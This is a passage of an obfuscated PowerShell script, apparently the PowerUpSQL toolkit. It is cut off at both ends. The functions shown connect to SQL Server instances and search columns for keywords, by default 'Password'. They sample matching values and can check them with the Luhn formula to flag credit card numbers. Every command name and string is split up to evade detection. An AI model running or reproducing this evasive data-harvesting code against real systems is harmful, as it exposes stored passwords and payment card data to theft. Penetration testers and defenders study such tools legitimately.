'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'st'+'.is_sch'+'em'+'a_pu'+'b'+'lis'+'hed,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'t.cr'+'ea'+'te'+'_date,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'st'+'.m'+'o'+'dify_date '+'AS'+' '+'modified'+'_da'+'t'+'e
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FR'+'OM '+"[$DbName].[INFORMATION_SCHEMA].[TABLES] "+'t'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JOIN'+' '+'s'+'ys.'+'tables'+' '+'st'+' '+'ON'+' '+'t.'+'TA'+'BLE_NAME '+'= '+'st.'+'name'+' '+'AND'+' '+'t.'+'TABLE'+'_SCHEMA'+' '+'= '+'O'+'BJECT'+'_S'+'CHEMA_NAME(st'+'.obj'+'ect_id'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JOI'+'N '+'sys.o'+'b'+'jec'+'ts '+'s '+'ON'+' '+'st'+'.obj'+'ect_i'+'d '+'= '+'s.'+'o'+'bject_'+'id
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LEFT'+' '+'JOIN'+' '+'sys.'+'ext'+'en'+'ded_'+'pr'+'operties '+'e'+'p '+'O'+'N '+'s.obj'+'ect_i'+'d '+'= '+'ep.'+'maj'+'o'+'r_id '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'AND'+' '+'e'+'p.'+'minor_'+'id '+'= '+'0 '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'J'+'OIN '+"[$DbName].[INFORMATION_SCHEMA].[COLUMNS] "+'c '+'ON'+' '+'t'+'.TA'+'B'+'LE_N'+'AME '+'= '+'c.TABL'+'E'+'_NA'+'ME '+'AND'+' '+'t.T'+'ABLE_SCH'+'EMA '+'= '+'c.TAB'+'LE_'+'SC'+'HEMA
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'H'+'ERE '+'1='+'1
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ColumnSearchFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ColumnFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$TableNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'OR'+'DER '+'B'+'Y '+'t.T'+'ABL'+'E_C'+'AT'+'ALOG'+', '+'t.TABLE'+'_'+'SCHEMA,'+' '+'t.TABL'+'E_N'+'AME, '+'c.O'+'R'+'D'+'I'+'NAL'+'_POSITION')

            
            ${t`BLRES`U`ltS} = &("{0}{1}{2}"-f 'Get-','SQLQ','uery') -Instance ${I`Ns`TaN`cE} -Query ${QUE`Ry} -Username ${Us`e`R`NaMe} -Password ${pAssWo`Rd} -SuppressVerbose

            
            ${tblC`oLu`mnS} = ${Tb`lC`olumNS} + ${t`BlresU`l`TS}
        }
    }

    End
    {
        
        ${Tbl`Co`lUMNS}
    }
}






Function geT-Sq`lCOLUmn`SA`mPLEDA`TA
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandAtOry = ${F`Alse},
        hElPMEssaGe = {"{9}{3}{8}{2}{0}{10}{6}{1}{7}{12}{5}{4}{11}" -f 'in accou','aut','doma','Serv','t','wi','to ','hentica','er or ','SQL ','nt ','h.','te '})]
        [string]${USe`R`NAME},

        [Parameter(mAndATory = ${fAl`sE},
        hELPMEsSaGE = {"{10}{1}{4}{0}{11}{14}{7}{13}{6}{12}{3}{9}{2}{8}{5}" -f'ain ','Q','c','authen','L Server or dom','te with.','t','asswor','a','ti','S','ac','o ','d ','count p'})]
        [string]${PaS`sWO`RD},

        [Parameter(MAndaToRy = ${F`AlSE},
                VALUeFrOmpIpEliNEByPrOPERtyNaMe = ${t`Rue},
        helPmessAGE = {"{1}{2}{3}{0}{4}{5}" -f' cr','Windo','w','s','edential','s.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`R`e`DENTIAl} =  (gET-VArIaBLe ('045'+'9M2')  -valuE)::"EmP`Ty",

        [Parameter(mandAtOrY = ${f`Al`se},
                VaLuEfROMPIPELINebypROPerTynaMe = ${tr`UE},
        helPmESSaGe = {"{6}{1}{0}{3}{4}{5}{2}" -f 'er inst','rv','ction to.','ance to con','n','e','SQL Se'})]
        [string]${In`StA`NcE},

        [Parameter(maNdAtoRY = ${fA`lse},
        hELpMESSAge = {(("{5}{2}{3}{0}{4}{1}" -f'o','put anything.','o','n{0}t ','ut','D')) -F  [ChaR]39})]
        [switch]${Noou`T`PUt},

        [Parameter(maNdatoRy = ${fA`lSe},
        HelPmESSaGe = {"{4}{1}{0}{2}{3}{5}"-f 'records t','ber of ','o',' s','Num','ample.'})]
        [int]${samP`l`e`SIze} = 1,

        [Parameter(MAndatory = ${fa`Lse},
        HElpmeSsAGE = {"{2}{10}{6}{0}{1}{4}{3}{11}{9}{7}{8}{5}" -f'r','ated ','C','st ','li','rch for.','sepe','ords t','o sea',' keyw','omma ','of'})]
        [string]${K`Eyw`oRdS} = ("{0}{1}"-f'Passwor','d'),

        [Parameter(mANdaToRY = ${f`ALSE},
        heLPMESsagE = {"{3}{6}{0}{2}{1}{5}{4}" -f'ilt','r','e','Databas','on.',' ','e name to f'})]
        [string]${d`A`TabA`SE`NAme},

        [Parameter(ManDatORY = ${f`AlSe},
        helpmeSSaGE = {"{1}{3}{6}{2}{8}{10}{4}{9}{5}{7}{0}" -f '.','Us',' to check if sam','e L','d c','edi','uhn formula','t card','ple is a ','r','vali'})]
        [switch]${vAl`Idat`ECC},

        [Parameter(mAnDaTOrY = ${fa`L`SE},
        HelpMessage = {(("{0}{3}{9}{6}{1}{2}{4}{8}{7}{5}"-f 'D','rom defau','l','on{0}t se','t da','.','les f','bases','ta','lect tab'))-F [cHaR]39})]
        [switch]${N`OdEfaU`Lts},

        [Parameter(MANDATORy = ${F`A`LSe},
        hELPMEsSage = {"{3}{4}{8}{2}{0}{7}{5}{6}{1}" -f'ors.  U','rapped.','bose err','Suppress ','v','unction is ','w','sed when f','er'})]
        [switch]${S`UPp`R`eSs`VERbOse}
    )

    Begin
    {
        
        ${tBL`DA`TA} = &("{2}{1}{0}"-f '-Object','ew','N') -TypeName ("{1}{0}{3}{2}{4}"-f'y','S','tem.Data.DataTabl','s','e')
        ${n`Ull} = ${TBL`DA`TA}."COl`UmNS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}" -f 'Comp','ame','uterN'))
        ${NU`LL} = ${T`BLd`ATA}."cOlu`Mns".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}{2}"-f'tanc','Ins','e'))
        ${n`UlL} = ${tbLd`A`TA}."cO`Lu`MNS".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{2}"-f 'Da','t','abase'))
        ${n`ULL} = ${TB`lD`Ata}."co`lUmNs".("{0}{1}"-f'A','dd').Invoke(("{0}{1}" -f 'Sche','ma'))
        ${n`UlL} = ${TBlDa`Ta}."co`lUM`NS".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}" -f'Tab','le'))
        ${n`ULL} = ${T`B`lDaTA}."coL`UM`NS".("{0}{1}" -f'A','dd').Invoke(("{1}{0}"-f'umn','Col'))
        ${N`ULL} = ${t`Bld`ATa}."C`oLumNS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{2}"-f'S','a','mple'))
        ${n`Ull} = ${Tb`L`daTa}."CO`LuM`Ns".("{1}{0}"-f'dd','A').Invoke(("{2}{0}{1}" -f'o','wCount','R'))

        if(${v`A`Lidat`eCC})
        {
            ${n`ULl} = ${TbLda`Ta}."co`LUMNs".("{1}{0}" -f'dd','A').Invoke(("{1}{0}" -f'CC','Is'))
        }
    }

    Process
    {
        
        ${C`Om`puT`Er`NAme} = &("{7}{6}{4}{5}{3}{0}{1}{2}"-f'stan','c','e','In','o','mputerNameFrom','-C','Get') -Instance ${iN`sTa`NCE}

        
        if(-not ${insta`N`CE})
        {
            ${i`NSTANCe} = ${e`Nv`:COmPU`TE`RN`AmE}
        }

        
        ${tE`s`Tco`NNE`ctIoN} = &("{0}{4}{3}{2}{5}{1}{6}" -f 'Ge','T','nnect','LCo','t-SQ','ion','est') -Instance ${iNS`TanCe} -Username ${uSE`Rn`Ame} -Password ${PAs`Swo`RD} -Credential ${cRe`DeNt`Ial} -SuppressVerbose | &("{2}{1}{0}{3}" -f 'ec','e-Obj','Wher','t') -FilterScript {
            ${_}."Stat`Us" -eq ("{2}{1}{0}"-f'ble','cessi','Ac')
        }
        if(-not ${TestCoNN`Ecti`On})
        {
            if( -not ${sUp`pREss`V`ERboSe})
            {
                &("{2}{0}{1}"-f 'rbos','e','Write-Ve') -Message ("$Instance "+': '+'CONN'+'ECT'+'ION '+'FA'+'ILED')
            }
            Return
        }
        else
        {
            if( -not ${Su`pPresS`VErb`OSE})
            {
                &("{2}{1}{3}{0}" -f 'bose','ite','Wr','-Ver') -Message ("$Instance "+': '+'STAR'+'T '+'SE'+'ARCH '+'DAT'+'A '+'B'+'Y '+'COLUM'+'N')
                &("{4}{1}{0}{2}{3}" -f 'rb','Ve','o','se','Write-') -Message ("$Instance "+': '+'- '+'Con'+'nec'+'tio'+'n '+'S'+'ucce'+'ss.')
                &("{2}{0}{3}{1}{4}"-f'ri','Verbo','W','te-','se') -Message ("$Instance "+': '+'- '+'Sear'+'ching'+' '+'fo'+'r '+'col'+'um'+'n '+'n'+'ames '+'th'+'at '+'mat'+'ch '+'c'+'riter'+'ia'+'...')
            }

            if(${nO`def`Au`LtS})
            {
                
                ${COL`UM`Ns} = &("{0}{1}{2}"-f'G','et-SQLColum','n') -Instance ${i`N`StanCe} -Username ${u`s`eRNAME} -Password ${pas`sw`OrD} -Credential ${cr`EDe`N`TIal} -DatabaseName ${d`ATABas`eName} -ColumnNameSearch ${k`eY`Wor`ds} -NoDefaults -SuppressVerbose
            }else
            {
                ${Co`Lum`NS} = &("{0}{1}{2}" -f 'Get-SQLCo','l','umn') -Instance ${i`NsT`ANcE} -Username ${USE`R`Name} -Password ${p`AS`sworD} -Credential ${crEDEN`Ti`Al} -DatabaseName ${Data`Bas`eNaME} -ColumnNameSearch ${KeY`Wor`dS} -SuppressVerbose
            }
        }

        
        if(${CO`LumNS})
        {
            
            ${c`oL`UmnS}|
            &("{0}{1}{2}" -f 'ForEac','h-','Object') -Process {
                ${SD`AtabAse`N`AME} = ${_}."DaT`Aba`sEN`AME"
                ${S`s`CHEmAN`AMe} = ${_}."s`cHE`maNamE"
                ${stab`lE`Na`Me} = ${_}."tABle`Na`me"
                ${scO`lU`mnNaMe} = ${_}."co`lu`MNn`Ame"
                ${Af`Fe`cTe`DCoLU`Mn} = "[$sDatabaseName].[$sSchemaName].[$sTableName].[$sColumnName]"
                ${aff`ECTe`dtA`B`LE} = "[$sDatabaseName].[$sSchemaName].[$sTableName]"
                ${Q`UERy} = ('US'+'E '+"$sDatabaseName; "+'SELE'+'CT '+'TOP'+' '+"$SampleSize "+"[$sColumnName] "+'F'+'ROM '+"$AffectedTable "+'WHE'+'RE '+"[$sColumnName] "+'i'+'s '+'n'+'ot '+'n'+'ull')
                ${Qu`E`RYrOw`coUNt} = ('U'+'SE '+"$sDatabaseName; "+'SELEC'+'T '+"count(CAST([$sColumnName] "+'as'+' '+'VARCHA'+'R(2'+'00)'+')) '+'a'+'s '+'Num'+'Ro'+'ws '+'FR'+'OM '+"$AffectedTable "+'WHER'+'E '+"[$sColumnName] "+'i'+'s '+'n'+'ot '+'n'+'ull')

                
                if( -not ${suPpres`Sv`er`BO`se})
                {
                    &("{3}{1}{2}{0}"-f 'rbose','ri','te-Ve','W') -Message ("$Instance "+': '+'- '+'Co'+'lumn '+'m'+'atc'+'h: '+"$AffectedColumn")
                    &("{0}{1}{2}"-f 'Write-V','er','bose') -Message ("$Instance "+': '+'- '+'S'+'ele'+'ctin'+'g '+"$SampleSize "+'row'+'s '+'of'+' '+'dat'+'a '+'sampl'+'e '+'f'+'rom '+'col'+'umn'+' '+"$AffectedColumn.")
                }

                
                ${R`OWCO`UnT} = &("{3}{0}{1}{2}" -f'et-SQLQ','uer','y','G') -Instance ${i`Nst`ANce} -Username ${uSERn`AmE} -Password ${pA`ssWO`RD} -Credential ${C`R`EDENTIal} -Query ${qUeR`yrO`Wc`OuNt} -SuppressVerbose | &("{4}{2}{1}{0}{3}"-f'bje','t-O','lec','ct','Se') -Property ("{1}{0}"-f'umRows','N') -ExpandProperty ("{0}{1}"-f 'N','umRows')

                
                &("{0}{2}{1}"-f 'Get-S','LQuery','Q') -Instance ${i`N`sTAncE} -Username ${UsE`RNamE} -Password ${PAS`sWo`Rd} -Credential ${crEd`en`TIAL} -Query ${Que`Ry} -SuppressVerbose |
                &("{0}{4}{2}{1}{3}" -f 'Se','t','ec','-Object','l') -ExpandProperty ${scO`Lu`mnNA`me} |
                &("{2}{4}{3}{1}{0}" -f 'ect','bj','F','-O','orEach') -Process {
                    if(${VaL`I`DateCc})
                    {
                        
                        ${vA`Lue} = 0
                        if( ( gET-VaRIaBLE  3TZ7sq  -valuEONl )::"t`Ryp`ARSE"(${_},[ref]${VaL`UE}))
                        {
                            ${lUH`NcHe`cK} = &("{0}{3}{2}{1}" -f'Test-IsLuhnV','id','l','a') ${_} -ErrorAction ("{2}{4}{3}{1}{0}"-f 'nue','Conti','Silen','y','tl')
                        }
                        else
                        {
                            ${lu`HncH`E`cK} = ("{0}{1}" -f'Fal','se')
                        }

                        
                        ${Nu`lL} = ${tB`LdAta}."ro`WS".("{1}{0}" -f'dd','A').Invoke(${c`OMPUteRN`AME}, ${in`St`A`NCE}, ${sdatABA`sena`Me}, ${SsCHe`MA`N`AME}, ${ST`AbL`ENa`mE}, ${Scolu`mnn`AmE}, ${_}, ${rOwc`o`UnT}, ${l`UhNC`heCK})
                    }
                    else
                    {
                        
                        ${N`ULL} = ${T`BlDATA}."RO`wS".("{0}{1}"-f'A','dd').Invoke(${cOM`P`U`T`eRnAme}, ${IN`sta`N`ce}, ${sDaTA`BASe`N`AME}, ${ss`c`Hem`ANAMe}, ${St`A`BleNa`Me}, ${sC`ol`UmnNa`ME}, ${_}, ${Row`C`OunT})
                    }
                }
            }
        }
        else
        {
            if( -not ${Supp`RESS`V`er`B`oSE})
            {
                &("{0}{1}{3}{2}"-f 'Wr','ite-Verb','se','o') -Message ("$Instance "+': '+'- '+'No'+' '+'c'+'olu'+'mns '+'we'+'re '+'foun'+'d'+' '+'th'+'at '+'matc'+'hed '+'th'+'e '+'s'+'ear'+'ch.')
            }
        }

        
        if( -not ${SUp`Pr`es`sVe`RbOSe})
        {
            &("{1}{4}{2}{0}{3}" -f'rbo','Wr','Ve','se','ite-') -Message ("$Instance "+': '+'END'+' '+'SEA'+'RCH'+' '+'DA'+'TA '+'BY'+' '+'C'+'OL'+'UMN')
        }
    }

    End
    {
        
        if ( -not ${N`O`Outp`Ut})
        {
            Return ${T`B`ldAtA}
        }
    }
}






Function GET-sqLcol`Um`N`samplE`dAt`A`TH`R`eaDEd
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandAtORY = ${Fa`l`sE},
                VaLUEFRoMpIpeLInEBypRopErtynAMe = ${t`RuE},
        hElPMeSsAgE = {"{6}{4}{9}{5}{0}{10}{7}{3}{2}{8}{1}"-f'r','th.','e w','icat','QL','rver o','S','t','i',' Se',' domain account to authen'})]
        [string]${uSE`Rn`AMe},

        [Parameter(MANDaTOrY = ${f`A`lsE},
                VaLUefrOmpipELiNeBYProPeRtynAmE = ${tr`Ue},
        helpmessAgE = {"{11}{7}{13}{5}{14}{3}{8}{6}{12}{10}{9}{4}{0}{15}{1}{2}"-f'to authen','e w','ith.','cc',' ','erve',' ','L ','ount','word','ss','SQ','pa','S','r or domain a','ticat'})]
        [string]${P`A`SswORD},

        [Parameter(mandatOry = ${FAl`SE},
                vaLuEFROmPipeLinEByproPERtYnaME = ${Tr`Ue},
        heLPmEssagE = {"{4}{3}{1}{0}{2}"-f 'l','credentia','s.','dows ','Win'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRed`e`Ntial} =  (gET-variABlE  0459m2  ).ValuE::"eMP`Ty",

        [Parameter(manDaTORY = ${F`A`lSE},
                valuEFROMPipelIne = ${T`RUe},
                VaLUefrOMPiPeLINebYPRopERTyNAMe = ${tr`Ue},
        hELPMEssaGE = {"{7}{3}{8}{9}{4}{2}{5}{6}{1}{0}"-f '.',' to','nce to conn','Q',' insta','ectio','n','S','L Serve','r'})]
        [string]${INst`An`ce},

        [Parameter(mAnDAtoRy = ${F`ALSe},
        HELPMEsSaGe = {(("{4}{2}{1}{3}{0}" -f'.','}t outp','n{0','ut anything','Do'))  -F[chAr]39})]
        [string]${n`oOUtPUt},

        [Parameter(maNDAtorY = ${F`A`lSe},
        HelpMessaGE = {"{0}{3}{8}{1}{2}{7}{4}{5}{6}"-f 'Num','r','ec','ber ','ds to ','sample','.','or','of '})]
        [int]${SAm`p`L`esIZE} = 1,

        [Parameter(MandaToRy = ${f`Al`SE},
        hElPmESsaGe = {"{2}{5}{0}{9}{3}{1}{7}{4}{6}{8}" -f 'perate','s','C','i','earch f','omma se','o','t of keywords to s','r.','d l'})]
        [string]${ke`ywo`RDS} = ("{0}{1}" -f 'P','assword'),

        [Parameter(MandaTOry = ${fAL`Se},
        hElpMEsSage = {"{4}{2}{1}{5}{6}{3}{0}"-f'ilter on.','se n','aba','f','Dat','ame',' to '})]
        [string]${dA`T`ABASenAmE},

        [Parameter(mandatorY = ${FA`L`se},
        helpmEsSAGE = {(("{6}{2}{4}{7}{1}{0}{11}{13}{10}{5}{8}{3}{12}{9}" -f's f','e','elect t','da','a','ault','DonzEpt s','bl',' ','.','def','ro','tabases','m ')) -rEPlaCE  ([cHaR]122+[cHaR]69+[cHaR]112),[cHaR]39})]
        [switch]${NOD`E`FaUltS},

        [Parameter(maNDAtory = ${f`ALSe},
        HElPMEsSAge = {"{10}{7}{5}{14}{9}{4}{11}{0}{8}{6}{2}{3}{1}{13}{12}" -f'o check if ','alid credit car','s',' a v',' ','uhn fo','e i','se L','sampl','ula','U','t','.','d','rm'})]
        [switch]${V`AliDa`T`EcC},

        [Parameter(maNdaTOrY = ${f`Alse},
        HelpmESsAGe = {"{3}{1}{0}{2}" -f'er of t','b','hreads.','Num'})]
        [int]${THRe`A`DS} = 5,

        [Parameter(mAndATOry = ${FA`lse},
        heLpmEssaGE = {"{9}{7}{5}{3}{1}{4}{13}{0}{12}{6}{8}{11}{10}{14}{2}{15}" -f'ed','e erro','rappe','os','rs. ','erb','when ','ress v','functi','Supp',' ','on is',' ',' Us','w','d.'})]
        [switch]${Su`PpressVe`RB`OSE}
    )

    Begin
    {
        
        ${t`Bl`DaTa} = &("{1}{0}{2}"-f 'jec','New-Ob','t') -TypeName ("{1}{0}{2}{3}"-f 'a','System.Data.DataT','b','le')
        ${n`ULL} = ${tBlD`AtA}."coL`UmnS".("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{1}{3}" -f 'p','uterNa','Com','me'))
        ${N`ULL} = ${T`Bl`DAta}."c`o`lumns".("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}"-f'c','e','Instan'))
        ${Nu`Ll} = ${tbLD`ATa}."cO`LUm`NS".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}"-f 'Data','bas','e'))
        ${nU`Ll} = ${T`BlDa`Ta}."CO`LuM`Ns".("{0}{1}" -f'Ad','d').Invoke(("{1}{0}" -f 'ema','Sch'))
        ${NU`lL} = ${tb`lD`ATA}."C`olU`mNS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}"-f 'Tab','le'))
        ${n`ULL} = ${T`Blda`TA}."COl`Umns".("{0}{1}"-f'A','dd').Invoke(("{1}{0}"-f 'olumn','C'))
        ${nU`LL} = ${tb`L`Data}."COLuM`Ns".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}"-f'Sam','ple'))
        ${n`UlL} = ${t`BlD`Ata}."c`oLUMns".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}"-f't','RowCoun'))

        if(${v`ALidAt`ecC})
        {
            ${NU`lL} = ${TbL`dA`TA}."Colu`MnS".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}"-f 'IsC','C'))
        }

        
        ${p`ipE`L`INEitEMS} = &("{3}{0}{1}{2}" -f'ew-','Obj','ect','N') -TypeName ("{0}{5}{1}{3}{4}{2}"-f 'Syste','ta.','le','D','ataTab','m.Da')

        
        if(-not ${INs`T`ANce})
        {
            ${iN`STa`NCE} = ${EN`V:`C`oMPUT`e`RName}
        }

        
        if(${INs`Tan`Ce})
        {
            ${p`Ro`VID`EiN`stanCe} = &("{2}{1}{0}" -f 'Object','w-','Ne') -TypeName ("{0}{1}{2}" -f 'PS','Obje','ct') -Property @{
                ("{1}{0}{2}"-f 't','Ins','ance') = ${insT`AN`CE}
            }
        }

        
        ${PI`p`elI`Nei`TeMS} = ${pI`P`eL`iNe`ITems} + ${p`Ro`VIDeINSt`An`cE}
    }

    Process
    {
        
        ${p`IPe`linEIT`Ems} = ${PipEl`inE`iT`E`ms} + ${_}
    }

    End
    {
        
        ${M`YSCript`B`LocK} = {
            
            ${i`NS`TaNCE} = ${_}."IN`sTANCe"

            
            ${Co`m`PuT`ErnA`me} = &("{0}{2}{5}{6}{1}{3}{4}"-f'Ge','m','t-','Inst','ance','ComputerNameF','ro') -Instance ${iNS`Tan`Ce}

            
            if(-not ${iNsTA`N`CE})
            {
                ${I`N`S`TAnce} = ${en`V`:`co`Mp`UTernaMe}
            }

            
            ${tes`T`conNEc`Ti`oN} = &("{1}{2}{3}{4}{0}" -f't','Get-SQLC','onnect','ionT','es') -Instance ${ins`TAN`ce} -Username ${u`Ser`NAmE} -Password ${PAssW`O`RD} -Credential ${c`REd`EnTi`AL} -SuppressVerbose | &("{1}{2}{0}" -f'bject','Where-','O') -FilterScript {
                ${_}."st`AtUS" -eq ("{2}{1}{3}{0}" -f'ible','cce','A','ss')
            }
            if(-not ${te`s`TcONne`ction})
            {
                if( -not ${sUp`PrEsSV`e`RbOSE})
                {
                    &("{4}{1}{0}{2}{3}"-f'e','rit','-Verbo','se','W') -Message ("$Instance "+': '+'C'+'ONNECTI'+'ON'+' '+'FA'+'ILE'+'D')
                }
                Return
            }
            else
            {
                if( -not ${s`UpP`RE`SsVE`RBOse})
                {
                    &("{1}{0}{2}" -f'bo','Write-Ver','se') -Message ("$Instance "+': '+'S'+'TART '+'SEA'+'RCH'+' '+'DATA'+' '+'BY'+' '+'COLU'+'MN')
                    &("{1}{0}{3}{2}" -f 'rite-Ver','W','se','bo') -Message ("$Instance "+': '+'- '+'C'+'o'+'nnec'+'tion '+'S'+'ucc'+'ess.')
                    &("{0}{2}{4}{3}{1}"-f 'W','e','ri','os','te-Verb') -Message ("$Instance "+': '+'- '+'S'+'ea'+'rching '+'fo'+'r '+'col'+'u'+'mn '+'nam'+'es'+' '+'tha'+'t '+'ma'+'tch'+' '+'crite'+'ria..'+'.')
                }

                if(${NO`deF`A`UltS})
                {
                    
                    ${Co`LU`MnS} = &("{1}{3}{2}{0}" -f 'SQLColumn','G','t-','e') -Instance ${in`s`Ta`NCE} -Username ${uS`er`NAmE} -Password ${P`A`S`swOrd} -Credential ${C`ReDEN`TIal} -DatabaseName ${dATa`Ba`sE`N`Ame} -ColumnNameSearch ${K`EyWOr`dS} -NoDefaults -SuppressVerbose
                }else
                {
                    ${coLU`M`Ns} = &("{1}{3}{2}{0}"-f 'n','Get-SQL','um','Col') -Instance ${IN`St`ANCE} -Username ${US`eRn`Ame} -Password ${pAs`s`WoRd} -Credential ${cReDEnt`i`Al} -DatabaseName ${d`AtA`BASENaME} -ColumnNameSearch ${k`E`ywORds} -SuppressVerbose
                }
            }

            
            if(${c`olUmnS})
            {
                
                ${cOLum`NS}|
                &("{2}{1}{0}" -f't','ch-Objec','ForEa') -Process {
                    ${S`Da`TA`BaS`eNaMe} = ${_}."D`A`TA`BASeNaMe"
                    ${SsCh`em`ANA`ME} = ${_}."ScHe`Ma`NAmE"
                    ${StAb`LE`NAme} = ${_}."tA`Bl`enAMe"
                    ${sCoLUM`N`NaME} = ${_}."cOl`U`mnNAmE"
                    ${A`F`FEcTed`CoLUMN} = "[$sDatabaseName].[$sSchemaName].[$sTableName].[$sColumnName]"
                    ${AFfEC`TE`D`TABLe} = "[$sDatabaseName].[$sSchemaName].[$sTableName]"
                    ${QU`Ery} = ('US'+'E '+"$sDatabaseName; "+'S'+'E'+'LECT '+'TO'+'P '+"$SampleSize "+"[$sColumnName] "+'F'+'ROM '+"$AffectedTable "+'WH'+'ERE '+"[$sColumnName] "+'is'+' '+'n'+'ot '+'n'+'ull')
                    ${qu`eR`yroW`C`OunT} = ('US'+'E '+"$sDatabaseName; "+'S'+'EL'+'ECT '+"count(CAST([$sColumnName] "+'as'+' '+'VA'+'RCHA'+'R(200'+')'+')) '+'a'+'s '+'N'+'um'+'Rows '+'F'+'ROM '+"$AffectedTable "+'WH'+'E'+'RE '+"[$sColumnName] "+'i'+'s '+'n'+'ot '+'n'+'ull')

                    
                    if( -not ${sUP`preSSv`eRb`o`SE})
                    {
                        &("{3}{2}{1}{0}" -f 'erbose','-V','rite','W') -Message ("$Instance "+': '+'- '+'Co'+'lu'+'mn '+'match:'+' '+"$AffectedColumn")
                        &("{1}{3}{0}{2}" -f 'r','Wr','bose','ite-Ve') -Message ("$Instance "+': '+'- '+'S'+'el'+'ecting '+"$SampleSize "+'row'+'s '+'of'+' '+'data'+' '+'sa'+'m'+'ple '+'fr'+'om '+'c'+'olumn'+' '+"$AffectedColumn.")
                    }

                    
                    ${R`O`wCoU`NT} = &("{1}{0}{2}" -f'-SQLQuer','Get','y') -Instance ${INs`TA`NCE} -Username ${u`seRNAmE} -Password ${PaS`sw`o`RD} -Credential ${cREd`e`NTI`Al} -Query ${qu`ErYROW`Cou`Nt} -SuppressVerbose | &("{1}{2}{0}" -f'ct-Object','Se','le') -Property ("{0}{1}" -f'NumR','ows') -ExpandProperty ("{0}{1}"-f 'NumRo','ws')

                    
                    &("{1}{0}{2}{3}"-f 'QL','Get-S','Q','uery') -Instance ${I`N`stAnce} -Username ${US`eRn`Ame} -Password ${pasSW`ord} -Credential ${Cr`Edent`ial} -Query ${Q`U`erY} -SuppressVerbose |
                    &("{0}{2}{1}" -f'Sel','bject','ect-O') -ExpandProperty ${S`COlUM`N`NamE} |
                    &("{1}{2}{3}{0}" -f 'ct','ForEach','-Ob','je') -Process {
                        if(${VA`Li`Dat`eCC})
                        {
                            
                            ${vA`lue} = 0
                            if( $3tz7sQ::"t`RYp`ArSe"(${_},[ref]${vA`luE}))
                            {
                                ${LuH`N`cHeCK} = &("{1}{2}{0}{3}" -f'n','T','est-IsLuh','Valid') ${_} -ErrorAction ("{0}{1}{3}{5}{2}{4}" -f 'Sile','n','yContinu','t','e','l')
                            }
                            else
                            {
                                ${Luhn`c`hECk} = ("{0}{1}"-f 'F','alse')
                            }

                            
                            ${nU`lL} = ${tbL`daTA}."R`owS".("{0}{1}" -f'Ad','d').Invoke(${ComPuteR`NA`Me}, ${I`NS`TANCe}, ${sdAtAbA`S`EnaMe}, ${s`schEmaNa`Me}, ${S`TABlena`mE}, ${SCO`lU`m`NNAmE}, ${_}, ${Ro`WcOU`Nt}, ${LUh`N`c`HEcK})
                        }
                        else
                        {
                            
                            ${N`UlL} = ${t`B`LDatA}."rO`wS".("{1}{0}"-f'd','Ad').Invoke(${c`OMP`U`TerName}, ${iN`s`T`Ance}, ${sDaT`AB`AsEName}, ${SS`C`HEM`AnAme}, ${sta`B`len`Ame}, ${S`c`OLu`MnNAmE}, ${_}, ${rOwC`O`Unt})
                        }
                    }
                }
            }
            else
            {
                if( -not ${SU`PPREssvErBo`SE})
                {
                    &("{2}{0}{1}{3}" -f'e-','V','Writ','erbose') -Message ("$Instance "+': '+'- '+'N'+'o '+'c'+'olum'+'ns '+'w'+'ere '+'fo'+'und '+'that'+' '+'ma'+'t'+'ched '+'the'+' '+'se'+'arc'+'h.')
                }
            }

            
            if( -not ${s`U`PPrEss`VEr`BOse})
            {
                &("{2}{1}{0}" -f'rbose','e','Write-V') -Message ("$Instance "+': '+'EN'+'D '+'SE'+'ARCH '+'DA'+'TA '+'BY'+' '+'COLUM'+'N')
            }
        }

        
        ${Pipel`INe`IT`ems} | &("{0}{3}{1}{2}"-f 'In','oke-Paralle','l','v') -ScriptBlock ${m`Y`SCrI`PTbLocK} -ImportSessionFunctions -ImportVariables -Throttle ${Th`Rea`ds} -RunspaceTimeout 2 -Quiet -ErrorAction ("{1}{0}{3}{2}{4}"-f'y','Silentl','inu','Cont','e')

        return ${Tbl`Da`TA}
    }
}






Function  GeT-s`Q`l`DaT`Aba`SeSc`hEma
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNDatORy = ${F`ALsE},
        hElPMeSSagE = {"{3}{8}{1}{6}{4}{5}{7}{0}{2}"-f 'te w','or domai','ith.','SQL S','u','nt to authe','n acco','ntica','erver '})]
        [string]${u`sE`Rname},

        [Parameter(MaNDAtORY = ${f`Al`SE},
        hELpMESSagE = {"{4}{5}{2}{7}{6}{1}{10}{8}{3}{9}{0}" -f 'te with.','wor','or domain ac','thent','SQL Serv','er ','unt pass','co','to au','ica','d '})]
        [string]${pas`SWorD},

